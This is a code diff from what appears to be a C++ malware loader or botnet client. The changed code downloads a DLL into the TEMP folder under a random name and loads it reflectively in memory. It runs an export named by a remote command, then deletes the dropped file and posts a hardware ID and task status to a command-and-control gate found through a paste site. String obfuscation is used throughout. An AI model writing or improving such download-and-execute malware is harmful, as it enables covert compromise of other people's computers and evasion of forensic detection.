@@ -124,11 +124,27 @@ public:
 					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".dll"));
 					Helpers::downloadFile(url, file);
 					std::string started = OBFUSCATE("failed");
-					hLibrary = lib.LoadFromFile(file.c_str()); // loaded the dll from byte array.
-					func fn = (func)lib.GetProcAddressFromMemory(hLibrary, (LPCSTR)v[3].c_str());
-					fn(v[4]);
-					lib.FreeLibraryFromMemory(hLibrary);		
+					try
+					{
+						hLibrary = lib.LoadFromFile(file.c_str()); // loaded the dll from byte array.
+						func fn = (func)lib.GetProcAddressFromMemory(hLibrary, (LPCSTR)v[3].c_str());
+						fn(v[4]);
+						lib.FreeLibraryFromMemory(hLibrary);
+					
+						started = OBFUSCATE("success");
+					}
+					catch (...)
+					{
+
+					}
+					try {
+						std::remove(file.c_str());
+					}
+					catch (...) {
+
+					}
 					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST", config.useragent);
+
 				}
 				else {
 					if (responseFromGate.find(OBFUSCATE("uninstall")) != std::string::npos) {
